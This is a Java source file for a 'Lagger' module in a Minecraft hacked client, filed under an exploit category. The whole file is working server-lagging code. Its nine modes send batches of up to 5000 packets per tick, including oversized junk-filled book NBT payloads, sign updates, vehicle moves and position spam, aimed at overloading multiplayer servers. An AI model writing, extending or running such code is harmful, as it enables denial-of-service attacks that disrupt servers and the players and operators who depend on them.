package io.ace.nordclient.hacks.exploit;

import io.ace.nordclient.CousinWare;
import io.ace.nordclient.hacks.Hack;
import io.ace.nordclient.utilz.Setting;
import net.minecraft.client.gui.GuiScreenBook;
import net.minecraft.entity.Entity;
import net.minecraft.init.Items;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.*;
import net.minecraft.tileentity.TileEntity;
import net.minecraft.tileentity.TileEntitySign;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.EnumHand;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.text.TextComponentString;

import java.util.ArrayList;

public class Lagger extends Hack {

    Setting laggerMode;
    Setting delay;

    public Lagger() {
        super("Lagger", Category.EXPLOIT, 2231666);
        ArrayList<String> laggerModes = new ArrayList<>();
        laggerModes.add("ANIMATION");
        laggerModes.add("SWAP");
        laggerModes.add("ENTITY");
        laggerModes.add("SIGN");
        laggerModes.add("BOOK");
        laggerModes.add("BOOKMOVE");
        laggerModes.add("BOOKSPAM");
        laggerModes.add("OPEN");
        laggerModes.add("POSITION");
        CousinWare.INSTANCE.settingsManager.rSetting(laggerMode = new Setting("Mode", this, "ANIMATION", laggerModes, "LaggerModes"));
        CousinWare.INSTANCE.settingsManager.rSetting(delay = new Setting("BatchSize", this, 5, 1, 5000, true, "LaggerDelay"));

    }

    public void onUpdate() {
        switch (laggerMode.getValString()) {
            case "ANIMATION":
                for (int i = 0; i < delay.getValInt(); i++) {
                    mc.player.connection.sendPacket(new CPacketAnimation(EnumHand.MAIN_HAND));
                }
                break;
            case "SWAP":
                for (int i = 0; i < delay.getValInt(); i++) {
                    mc.player.connection.sendPacket(
                            new CPacketPlayerDigging(CPacketPlayerDigging.Action.SWAP_HELD_ITEMS,
                                    BlockPos.ORIGIN, mc.player.getHorizontalFacing()));
                }
                break;
            case "ENTITY":
                for (int i = 0; i < delay.getValInt(); i++) {
                    final Entity riding = mc.player.getRidingEntity();
                    if (riding != null) {
                        riding.posX = mc.player.posX;
                        riding.posY = mc.player.posY + 1337;
                        riding.posZ = mc.player.posZ;
                        mc.player.connection.sendPacket(new CPacketVehicleMove(riding));
                    }
                }
                break;
            case "SIGN":
                for (TileEntity te : mc.world.loadedTileEntityList) {
                    if (te instanceof TileEntitySign) {
                        final TileEntitySign tileEntitySign = (TileEntitySign) te;
                        for (int i = 0; i < delay.getValInt(); i++) {
                            mc.player.connection.sendPacket(
                                    new CPacketUpdateSign(tileEntitySign.getPos(),
                                            new TextComponentString[]{
                                                    new TextComponentString("this is"),
                                                    new TextComponentString("totally"),
                                                    new TextComponentString("a legit action"),
                                                    new TextComponentString("i swear")}));
                        }
                    }
                }
                break;
            case "BOOK":
            case "BOOKMOVE":
                final ItemStack itemStack = new ItemStack(Items.WRITABLE_BOOK);
                final NBTTagList pages = new NBTTagList();

                for (int page = 0; page < 50; page++) {
                    pages.appendTag(new NBTTagString("192i9i1jr1fj8fj893fj84ujv8924jv2j4c8j248vj2498u2-894u10fuj0jhv20j204uv902jv90j209vj204vj"));
                }

                final NBTTagCompound tag = new NBTTagCompound();
                tag.setString("author", mc.player.getName());
                tag.setString("title", "I think you need better plugins");
                tag.setTag("pages", pages);
                itemStack.setTagCompound(tag);

                for (int i = 0; i < delay.getValInt(); i++) {
                    if (laggerMode.getValString().equals("BOOK"))
                        mc.player.connection.sendPacket(new CPacketCreativeInventoryAction(0, itemStack));
                    else if (laggerMode.getValString().equals("BOOKMOVE"))
                        mc.player.connection.sendPacket(new CPacketClickWindow(0, 0, 0,
                                ClickType.PICKUP, itemStack, (short) 0));
                }
                break;
            case "BOOKSPAM":
                for (int i = 0; i < delay.getValInt(); i++) {
                        mc.player.connection.sendPacket(new CPacketPlayerTryUseItem(EnumHand.MAIN_HAND));
                       // if (mc.currentScreen instanceof GuiScreenBook)
                           // mc.player.closeScreen();

                    }
                break;
            case "OPEN":
                for (int i = 0; i < delay.getValInt(); i++) {
                    mc.player.connection.sendPacket(new CPacketPlayerTryUseItemOnBlock(mc.objectMouseOver.getBlockPos(), EnumFacing.UP, EnumHand.MAIN_HAND, 0, 0, 0));
                    }
                break;
            case "POSITION" :
                for (int i = 0; i < delay.getValInt(); i++) {
                    mc.player.connection.sendPacket(new CPacketPlayer.Position(mc.player.posX, mc.player.posY, mc.player.posZ, mc.player.onGround));
                }
                break;
                }

        }
        //
    }

